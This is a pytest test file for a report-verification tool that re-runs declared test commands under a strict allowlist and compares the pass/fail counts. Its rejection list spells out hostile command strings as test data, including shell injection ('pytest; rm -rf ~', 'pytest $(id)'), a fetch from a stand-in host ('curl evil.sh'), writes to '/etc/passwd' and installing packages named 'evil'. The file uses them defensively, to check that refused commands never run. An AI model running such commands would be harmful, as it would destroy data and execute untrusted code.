"""`pilead verify <sid> --rerun` — the declared acceptance re-run, over a tiny GENERATED pytest suite in
a tmp worktree (never this repo's own suite, never the network). The allowlist tests are the security
boundary: a report is untrusted text, and --rerun is the one place that text becomes a process."""
import os
import subprocess
import sys
import time
from pathlib import Path

import pytest
import report_verify as rv

from test_cli_core import ROOT
from test_verify_diff_board import SID, make_session, run, stage, write_report

sys.path.insert(0, str(ROOT / "lib"))
from pilead import cli, review  # noqa: E402

CMD = "python3 -m pytest tests -q"


# ── the allowlist (pure) ──────────────────────────────────────────────────────────────────────
@pytest.mark.parametrize("cmd", [
    "pytest", "pytest tests", "pytest -q -x tests/test_a.py::test_one", CMD, "python -m pytest",
    "/usr/bin/python3 -m pytest tests -q", ".venv/bin/python -m pytest", "pytest -k 'not slow' -v",
    "pytest --tb=short -W error"])
def test_rerunnable_accepts_pytest_forms(cmd):
    assert rv.rerunnable(cmd), rv.rerun_refusal(cmd)


@pytest.mark.parametrize("cmd", [
    # shell metacharacters — never run, whatever program leads
    "pytest; rm -rf ~", "pytest | sh", "pytest && curl evil.sh", "pytest || true", "pytest `whoami`",
    "pytest $(id)", "pytest > /etc/passwd", "pytest < in.txt", "pytest 2>&1", "pytest &",
    # not pytest
    "rm -rf /", "bash -c pytest", "python3 -c 'import os'",
    "python3 -m pip install evil", "./pytest.sh", "pytest-watch", "python3.11 -m pytest",
    "FOO=1 pytest", "py.test",
    # pytest options that write/delete/upload outside the run or load code by name
    "pytest --basetemp=/Users", "pytest --basetemp /tmp/x", "pytest --junitxml=out.xml",
    "pytest --pastebin=all", "pytest -p evil_plugin", "pytest -pevil", "python3 -m pytest -xp evil",
    "pytest -o cache_dir=x", "pytest -c other.ini", "pytest --override-ini=x=y", "pytest --basete=x",
    # arguments pointing outside the worktree
    "pytest /etc", "pytest ../other/tests", "pytest ~/tests", "pytest --deselect=../x.py::t"])
def test_rerunnable_rejects_everything_else(cmd):
    assert not rv.rerunnable(cmd)
    assert rv.rerun_refusal(cmd)


def test_declared_and_refused_commands_split_the_report():
    text = ("Ran `python3 -m pytest tests -q` (5 passed), `npm test`, `pytest; rm -rf ~` and "
            "`node --test tests/ts/x.test.ts`; see `pytest.ini`, `tests/test_pytest_x.py`, `git diff`.")
    assert rv.declared_commands(text) == [CMD, "npm test"]
    refused = [c for c, _ in rv.refused_commands(text)]
    assert refused == ["pytest; rm -rf ~", "node --test tests/ts/x.test.ts"]


def test_rerun_counts_reads_the_last_summary_line():
    assert rv.rerun_counts("x\n3 passed in 0.01s\n") == (3, 0)
    assert rv.rerun_counts("FAILED t::a\n1 failed, 2 passed, 1 error in 0.1s\n") == (2, 2)
    assert rv.rerun_counts("2 failed in 0.1s") == (0, 2)
    assert rv.rerun_counts("/usr/bin/python3: No module named pytest") == (None, None)


# ── pure verdicts for the run outcomes ────────────────────────────────────────────────────────
GREEN = ("Built it; 3 passed.\n\nStatus: clean\nRisk flags: none\nUNVERIFIED: none\nChanged: src/a.py\n\n"
         "## What changed\n- src/a.py: edited\n\nRan `python3 -m pytest tests -q`: 3 passed.\n"
         "Changes are staged (not committed).\n")


def _verify(rerun, text=GREEN):
    return rv.verify(text, {"staged": ["src/a.py"], "modified": [], "untracked": [],
                            "repo_entries": {"src"}, "repo_files": set(), "commits_since": 0,
                            "rerun": rerun})


def _r(**kw):
    base = {"cmd": CMD, "passed": 3, "failed": 0, "declared": 3, "returncode": 0, "timed_out": False,
            "error": None, "timeout": 600}
    base.update(kw)
    return base


def test_nonzero_exit_without_counts_is_inconclusive_not_mismatch():
    """Wrong venv / pytest missing: the run said nothing comparable — INCONCLUSIVE, named."""
    res = _verify([_r(passed=None, failed=None, returncode=1)])
    assert res["verdict"] == rv.INCONCLUSIVE
    assert {"rerun-nonzero-exit", "rerun-unparsable"} <= {f["code"] for f in res["findings"]}


def test_not_rerunnable_declared_command_is_a_named_note_not_the_verdict():
    """Mixed-stack repos always declare one (`yarn test`): named as NOT RE-RUN, verdict unaffected."""
    res = _verify([_r()], GREEN + "Also ran `yarn test`.\n")
    assert res["verdict"] == rv.COUNTS_MATCH
    assert [f["level"] for f in res["findings"] if f["code"] == "rerun-not-rerunnable"] == ["note"]
    lines = "\n".join(t for t, _ in rv.render(res, SID, 1))
    assert "NOT RE-RUNNABLE — `yarn test`" in lines and "NOT RE-RUN: `yarn test`" in lines
    assert rv.rerun_matched(res)


def test_rerun_requested_with_only_refused_commands_is_inconclusive():
    """INCONCLUSIVE only when --rerun was asked for and NOTHING declared could be re-run."""
    res = _verify([], GREEN.replace("`python3 -m pytest tests -q`", "`yarn test`"))
    assert res["verdict"] == rv.INCONCLUSIVE
    assert {"rerun-nothing-to-run", "rerun-not-rerunnable"} <= {f["code"] for f in res["findings"]}


# ── end to end over a generated suite ─────────────────────────────────────────────────────────
@pytest.fixture
def py_env(tmp_path, monkeypatch):
    """`python3` on PATH is THIS interpreter (a wrapper), and pytest is importable to it even with
    the conftest's PYTHONNOUSERSITE — the fake iterm2 dir stays first on PYTHONPATH."""
    bindir = tmp_path / "pybin"
    bindir.mkdir()
    (bindir / "python3").write_text(f'#!/bin/sh\nexec "{sys.executable}" "$@"\n')
    (bindir / "python3").chmod(0o755)
    monkeypatch.setenv("PATH", str(bindir) + os.pathsep + os.environ["PATH"])
    site = str(Path(pytest.__file__).resolve().parent.parent)
    monkeypatch.setenv("PYTHONPATH", os.environ["PYTHONPATH"] + os.pathsep + site)
    for var in ("PYTEST_ADDOPTS", "PYTEST_PLUGINS"):
        monkeypatch.delenv(var, raising=False)


def suite(wt, passing=3, failing=0, sleep=0):
    (wt / "pytest.ini").write_text("[pytest]\naddopts = -p no:cacheprovider\n")
    (wt / "tests").mkdir(exist_ok=True)
    body = "import time\n"
    body += "".join(f"def test_ok_{i}():\n    assert True\n" for i in range(passing))
    body += "".join(f"def test_bad_{i}():\n    assert False\n" for i in range(failing))
    if sleep:
        body += f"def test_slow():\n    time.sleep({sleep})\n"
    (wt / "tests" / "test_generated.py").write_text(body)


def session(tmp_path, report_text, **suite_kw):
    wt, sdir = make_session(tmp_path)
    suite(wt, **suite_kw)
    stage(wt, "src/a.py")
    write_report(sdir, report_text)
    return wt, sdir


def test_green_report_over_green_suite_is_counts_match(tmp_path, py_env):
    session(tmp_path, GREEN, passing=3)
    r = run("verify", SID, "--rerun")
    assert r.returncode == 0, r.stdout + r.stderr
    assert "VERDICT: COUNTS-MATCH" in r.stdout
    assert f"RE-RAN `{CMD}` → 3 passed, exit 0 (report declares: 3)" in r.stdout


def test_green_report_over_red_suite_is_mismatch(tmp_path, py_env):
    session(tmp_path, GREEN, passing=3, failing=1)
    r = run("verify", SID, "--rerun")
    assert r.returncode == 1, r.stdout
    assert "VERDICT: MISMATCH" in r.stdout
    assert "re-ran RED: 1 failed/errored" in r.stdout
    assert "RERUN NON-ZERO EXIT" in r.stdout


def test_declared_count_differs_is_mismatch(tmp_path, py_env):
    session(tmp_path, GREEN.replace("3 passed", "5 passed"), passing=3)
    r = run("verify", SID, "--rerun")
    assert r.returncode == 1 and "3 passed, but the report declares 5 passed" in r.stdout


def test_without_rerun_nothing_is_executed(tmp_path, py_env):
    wt, _ = session(tmp_path, GREEN, passing=3)
    (wt / "tests" / "conftest.py").write_text(f"open({str(tmp_path / 'RAN')!r}, 'w').close()\n")
    r = run("verify", SID)
    assert r.returncode == 0 and "NOT RE-RUN" in r.stdout
    assert not (tmp_path / "RAN").exists()
    run("verify", SID, "--rerun")
    assert (tmp_path / "RAN").exists()  # the marker works: --rerun really runs the suite


def _verify_in_process(capsys, *args):
    rc = cli.main(["verify", SID, *args])
    return rc, capsys.readouterr().out


def test_rerun_is_argv_only_never_a_shell(tmp_path, py_env, monkeypatch, capsys):
    session(tmp_path, GREEN + "And `npm test`; `pytest; rm -rf ~`.\n", passing=3)
    real_popen, calls = subprocess.Popen, []

    def spy(argv, *a, **kw):
        calls.append((argv, kw))
        return real_popen(argv, *a, **kw)

    monkeypatch.setattr(review.subprocess, "Popen", spy)  # subprocess.run (git) goes through it too
    _verify_in_process(capsys, "--rerun")
    runs = [(a, k) for a, k in calls if a[0] != "git"]
    assert [a for a, _ in runs] == [["python3", "-m", "pytest", "tests", "-q"]]  # refused ones never ran
    argv, kw = runs[0]
    assert kw["shell"] is False and kw["start_new_session"] is True and kw["cwd"]


def test_timeout_is_inconclusive_with_its_finding(tmp_path, py_env, monkeypatch, capsys):
    session(tmp_path, GREEN, passing=3, sleep=60)
    monkeypatch.setattr(review, "RERUN_TIMEOUT", 3)
    rc, out = _verify_in_process(capsys, "--rerun")
    assert rc == rv.EXIT_CODES[rv.INCONCLUSIVE]
    assert "VERDICT: INCONCLUSIVE" in out
    assert f"RERUN TIMEOUT — `{CMD}` did not finish within 3s" in out
    assert f"TIMED OUT `{CMD}` after 3s" in out


def test_timeout_kills_the_whole_process_group(tmp_path, py_env, monkeypatch, capsys):
    """A suite that forks its own long-lived child: on timeout the grandchild dies with the run."""
    wt, _ = session(tmp_path, GREEN, passing=3)
    pidfile = tmp_path / "grandchild.pid"
    (wt / "tests" / "test_spawns.py").write_text(
        "import subprocess, time\n"
        "def test_spawns():\n"
        "    p = subprocess.Popen(['sleep', '30'])\n"
        f"    open({str(pidfile)!r}, 'w').write(str(p.pid))\n"
        "    time.sleep(30)\n")
    monkeypatch.setattr(review, "RERUN_TIMEOUT", 3)
    rc, out = _verify_in_process(capsys, "--rerun")
    assert rc == rv.EXIT_CODES[rv.INCONCLUSIVE] and "RERUN TIMEOUT" in out
    pid = int(pidfile.read_text())
    deadline = time.time() + 5
    while time.time() < deadline:  # SIGKILLed and orphaned: launchd/init reaps it
        try:
            os.kill(pid, 0)
        except ProcessLookupError:
            break
        time.sleep(0.1)
    else:
        os.kill(pid, 9)
        pytest.fail(f"grandchild sleep {pid} survived the timeout")


def test_mixed_stack_report_clears_with_npm_test_named_not_rerun(tmp_path, py_env):
    """The acceptance shape of a pi-lead report: pytest (re-runs, matches) + `npm test` (refused)."""
    session(tmp_path, GREEN + "And `npm test` green.\n", passing=3)
    r = run("verify", SID, "--rerun", "--for-autocommit", "--in-plan", "--diff-reviewed")
    assert r.returncode == 0, r.stdout
    assert "VERDICT: COUNTS-MATCH" in r.stdout and "AUTO-COMMIT: CLEARED" in r.stdout
    assert "NOT RE-RUN: `npm test`" in r.stdout
    assert f"RE-RAN `{CMD}` → 3 passed, exit 0" in r.stdout


def test_for_autocommit_with_rerun_clears_only_on_match(tmp_path, py_env):
    wt, _ = session(tmp_path, GREEN, passing=3)
    flags = ("--for-autocommit", "--in-plan", "--diff-reviewed")
    r = run("verify", SID, "--rerun", *flags)
    assert r.returncode == 0 and "AUTO-COMMIT: CLEARED" in r.stdout, r.stdout
    assert "COUNTS-MATCH and the --rerun matched" in r.stdout

    suite(wt, passing=3, failing=1)
    r = run("verify", SID, "--rerun", *flags)
    assert r.returncode != 0 and "NOT-CLEARED-BECAUSE-verdict-is-MISMATCH" in r.stdout
    r = run("verify", SID, *flags)  # no --rerun: unchanged — a stated choice, the red suite unseen
    assert r.returncode == 0 and "AUTO-COMMIT: CLEARED" in r.stdout


def test_clearance_needs_rerun_match_even_when_verdict_is_counts_match():
    """A report that itself declares failures keeps a non-zero exit as a note, so the verdict can
    stay COUNTS-MATCH — condition 1 must still refuse, because the re-run did not come back green."""
    text = GREEN.replace("Ran `python3", "Known: 1 failed upstream. Ran `python3")
    res = _verify([_r(failed=1, returncode=1)], text)
    assert res["verdict"] == rv.COUNTS_MATCH
    clr = rv.clearance(res, in_plan=True, diff_reviewed=True)
    assert not clr["cleared"] and clr["reason"] == "rerun-did-not-match"
    no_rerun = rv.clearance(_verify(None, text), in_plan=True, diff_reviewed=True)
    assert no_rerun["conditions"][0]["name"] == "verify verdict is COUNTS-MATCH"
    # a refused declared command does not block: the rerunnable one matched, `yarn test` is a note
    mixed = rv.clearance(_verify([_r()], GREEN + "Also `yarn test`.\n"), in_plan=True, diff_reviewed=True)
    assert mixed["cleared"], mixed["reason"]


def test_help_documents_rerun():
    r = run("verify", "--help")
    assert "--rerun" in r.stdout and "never a" in r.stdout


# ── every declared count must be compared by some re-run ──────────────────────────────────────
# "Unknown is not zero": a count the report declares for a runner that no re-run of that runner
# produced was never compared, whichever runner did re-run — INCONCLUSIVE, never a clearing verdict.
BOTH = GREEN.replace("Ran `python3 -m pytest tests -q`: 3 passed.\n",
                     "Ran `python3 -m pytest tests -q`: 3 passed. Ran `node --test`: node 5/5.\n")


def _node_row(**kw):
    return _r(**dict({"cmd": "node --test", "runner": "node", "passed": 5, "declared": 5}, **kw))


def _not_compared(res):
    return [f["text"] for f in res["findings"] if f["code"] == "rerun-declared-not-compared"]


def test_declared_node_count_with_only_pytest_rerun_is_not_compared():
    assert rv.declared_for(BOTH) == {"pytest": 3, "node": 5, "node_total": 5}
    res = _verify([_r(runner="pytest")], BOTH)
    assert res["verdict"] == rv.INCONCLUSIVE
    assert _not_compared(res) == ["the report declares node: 5 passed, but no re-run produced a node "
                                  "count — that number was not compared"]
    assert [f["level"] for f in res["findings"] if f["code"] == "rerun-declared-not-compared"] == [
        "inconclusive"]
    lines = "\n".join(t for t, _ in rv.render(res, SID, 1))
    assert "? the report declares node: 5 passed, but no re-run produced a node count" in lines
    clr = rv.clearance(res, in_plan=True, diff_reviewed=True)
    assert not clr["cleared"] and clr["reason"] == "verdict-is-INCONCLUSIVE"


def test_declared_node_count_with_only_pytest_rerun_and_no_runner_field_is_not_compared():
    """A row without `runner` (the shape before per-runner rows) is its command's runner: pytest."""
    res = _verify([_r()], BOTH)
    assert res["verdict"] == rv.INCONCLUSIVE
    assert _not_compared(res) == ["the report declares node: 5 passed, but no re-run produced a node "
                                  "count — that number was not compared"]


def test_declared_pytest_count_with_only_node_rerun_is_not_compared():
    res = _verify([_node_row()], BOTH)
    assert res["verdict"] == rv.INCONCLUSIVE
    assert _not_compared(res) == ["the report declares pytest: 3 passed, but no re-run produced a "
                                  "pytest count — that number was not compared"]
    clr = rv.clearance(res, in_plan=True, diff_reviewed=True)
    assert not clr["cleared"] and clr["reason"] == "verdict-is-INCONCLUSIVE"


def test_declared_pytest_count_with_only_npm_node_row_is_not_compared():
    """`npm test` printing node's summary only: node is compared, the declared pytest count is not."""
    res = _verify([_node_row(cmd="npm test")], BOTH)
    assert res["verdict"] == rv.INCONCLUSIVE
    assert _not_compared(res) == ["the report declares pytest: 3 passed, but no re-run produced a "
                                  "pytest count — that number was not compared"]


def test_both_declared_counts_rerun_and_matching_still_clears():
    res = _verify([_r(runner="pytest"), _node_row()], BOTH)
    assert res["verdict"] == rv.COUNTS_MATCH
    assert _not_compared(res) == []
    assert rv.rerun_matched(res)
    clr = rv.clearance(res, in_plan=True, diff_reviewed=True)
    assert clr["cleared"], clr["reason"]


def test_only_pytest_declared_and_rerun_is_unchanged():
    assert rv.declared_for(GREEN) == {"pytest": 3, "node": None, "node_total": None}
    for row in (_r(), _r(runner="pytest")):
        res = _verify([row])
        assert res["verdict"] == rv.COUNTS_MATCH
        assert _not_compared(res) == []
        clr = rv.clearance(res, in_plan=True, diff_reviewed=True)
        assert clr["cleared"], clr["reason"]


def test_plain_count_compared_by_a_node_row_counts_as_compared():
    """A node-only project may declare a plain `N passed`: the node row carries it as its declared
    count (no pytest summary printed), so that number WAS compared."""
    text = GREEN.replace("Ran `python3 -m pytest tests -q`: 3 passed.\n", "Ran `node --test`.\n")
    assert rv.declared_for(text) == {"pytest": 3, "node": None, "node_total": None}
    res = _verify([_node_row(passed=3, declared=3)], text)
    assert res["verdict"] == rv.COUNTS_MATCH and _not_compared(res) == []
    # the same plain count with a node row that did NOT take it (a pytest summary was printed too,
    # and it is that pytest row that is missing) is still named
    res = _verify([_node_row(passed=3, declared=None)], text)
    assert res["verdict"] == rv.INCONCLUSIVE
    assert _not_compared(res) == ["the report declares pytest: 3 passed, but no re-run produced a "
                                  "pytest count — that number was not compared"]


def test_nothing_rerun_is_unchanged_by_the_not_compared_rule():
    """--rerun with every command NOT RE-RUN: `rerun-nothing-to-run` as before, no not-compared line."""
    res = _verify([], BOTH.replace("`python3 -m pytest tests -q`", "`yarn test`")
                  .replace("`node --test`", "`node --test x.js`"))
    assert res["verdict"] == rv.INCONCLUSIVE
    codes = [f["code"] for f in res["findings"]]
    assert "rerun-nothing-to-run" in codes and "rerun-declared-not-compared" not in codes
